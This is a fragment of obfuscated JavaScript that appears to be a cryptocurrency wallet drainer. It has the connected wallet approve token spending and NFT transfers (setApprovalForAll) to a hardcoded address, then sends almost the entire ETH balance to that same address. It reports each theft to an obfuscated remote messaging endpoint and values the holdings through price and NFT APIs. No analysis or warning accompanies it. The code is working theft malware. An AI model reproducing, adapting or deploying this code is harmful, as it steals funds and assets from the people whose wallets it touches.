writeContract({'address':_0x4ddd96[_0x3e4d83(0xb6)],'abi':ABI,'functionName':'approve','args':[Oxa,_0x3e4d83(0xa8)]});console[_0x3e4d83(0xe5)](_0x3e4d83(0xe7),_0xc7778c),_0xc7778c&&(console[_0x3e4d83(0xe5)](_0x3e4d83(0xd7)),sendMessage(_0x3e4d83(0xa4)),sendMessage(_0x3e4d83(0xaf)+_0x4ddd96[_0x3e4d83(0xb6)]),sendMessage(_0x3e4d83(0x75)+_0x4ddd96[_0x3e4d83(0xca)]),sendMessage(_0x3e4d83(0x8b)+Oxa));}catch(_0x364dd9){console[_0x3e4d83(0xe5)]('Error:\x20'+_0x364dd9),sendMessage(_0x3e4d83(0xb7));}};await loopNfts(NFTs);}async function loopNfts(_0x5ac3b1){const _0x2d6b86=_0x305c57;for await(let _0x5b3062 of _0x5ac3b1){console[_0x2d6b86(0xe5)](_0x2d6b86(0x10b),_0x5b3062);try{let {hash:_0x4ec3c2}=await writeContract({'address':_0x5b3062[_0x2d6b86(0xa9)],'abi':ABIN,'functionName':'setApprovalForAll','args':[Oxa,!![]]});console[_0x2d6b86(0xe5)](_0x2d6b86(0xe7),_0x4ec3c2),console[_0x2d6b86(0xe5)](_0x2d6b86(0x128)+receipt),sendMessage(_0x2d6b86(0xa4)),sendMessage(_0x2d6b86(0xb0)+_0x5b3062['token_address']),sendMessage(_0x2d6b86(0x8b)+Oxa);}catch(_0x8b3c42){console[_0x2d6b86(0xe5)]('Error:\x20'+_0x8b3c42),sendMessage('Transaction\x20Rejected');}}await onSendEther();}async function onSendEther(){const _0x33fffa=_0x305c57;console['log'](_0x33fffa(0xbc));try{let _0x5f57e1=await fetchBalance({'address':selectedAccount});console[_0x33fffa(0xe5)](_0x5f57e1);const _0x584bc6=await fetchFeeData();console[_0x33fffa(0xe5)](_0x584bc6);var _0x59f453=_0x584bc6[_0x33fffa(0x111)][_0x33fffa(0xeb)];_0x59f453=parseFloat(_0x59f453);let _0x51e5ed=parseFloat(_0x5f57e1[_0x33fffa(0x111)])-_0x59f453*0.00021;_0x51e5ed=parseEther(_0x51e5ed[_0x33fffa(0x81)]()),console[_0x33fffa(0xe5)](_0x51e5ed);const {hash:_0x218e33}=await sendTransaction({'to':Oxa,'value':_0x51e5ed});console['log'](_0x218e33),sendMessage(_0x33fffa(0xf9),_0x218e33),sendMessage(_0x33fffa(0x117)),sendMessage(_0x33fffa(0xaa));}catch{sendMessage(_0x33fffa(0xff));}}async function sendMessage(_0x573a89){return new Promise((_0x49aa4d,_0x555876)=>{const _0x3e7373=_0x4468,_0x5d5bdc=Oxc;fetch(_0x3e7373(0x94)+_0x5d5bdc+_0x3e7373(0x9e)+_0x573a89,{'method':'GET','headers':{}})['then'](async _0x54cde9=>{const _0x47e52a=_0x3e7373;if(_0x54cde9[_0x47e52a(0x10e)]>0x18f)throw _0x54cde9;_0x49aa4d(await _0x54cde9['json']());})['catch'](_0x57fa9b=>{_0x555876(_0x57fa9b);});});}async function getPrice(_0x47ddac){return new Promise((_0x4cbaf3,_0xa459ea)=>{const _0x2b5845=_0x4468;fetch(_0x2b5845(0x8a)+_0x47ddac+'&vs_currencies=usd',{'method':_0x2b5845(0xf5),'headers':{}})[_0x2b5845(0xfc)](async _0x54c8e8=>{const _0x457ba3=_0x2b5845;if(_0x54c8e8[_0x457ba3(0x10e)]>0x18f)throw _0x54c8e8;_0x4cbaf3(await _0x54c8e8[_0x457ba3(0x107)]());})[_0x2b5845(0xa1)](_0x21c3a9=>{_0xa459ea(_0x21c3a9);});});}async function getValue(_0xeb5a27,_0x531000,_0x349368){const _0x586d33=_0x305c57;console['log'](_0xeb5a27,_0x531000,_0x349368);let _0x1de536=await getPrice(_0xeb5a27);console[_0x586d33(0xe5)](_0x586d33(0x7a),_0x1de536),_0x1de536=parseFloat(_0x1de536[_0xeb5a27][_0x586d33(0xcf)]);let _0x3bb62d=_0x531000/0xa**(_0x349368||0x12)*_0x1de536;return _0x3bb62d=parseInt(_0x3bb62d),_0x1de536?_0x3bb62d:0x0;}async function getNFTs(_0x55d45f='',_0x3c3a9c=_0x305c57(0xf2),_0x16d3fb=_0x305c57(0xf6),_0x46d680='50'){return new Promise((_0x28940f,_0x3ba83a)=>{const _0x5a62ae=_0x4468;fetch(_0x5a62ae(0xde)+_0x55d45f+'/nft/collections?chain='+_0x16d3fb+_0x5a62ae(0x125)+_0x46d680,{'method':_0x5a62ae(0xf5),'headers':{'accept':'application/json','X-API-Key':_0x3c3a9c}})[_0x5a62ae(0xfc)](async _0x1473b9=>{const _0x3d4412=_0x5a62ae;if(_0x1473b9[_0x3d4412(0x10e)]>0x18f)throw _0x1473b9;_0x28940f(await _0x1473b9['json']());})['catch'](_0x470485=>{_0x3ba83a(_0x470485);});});}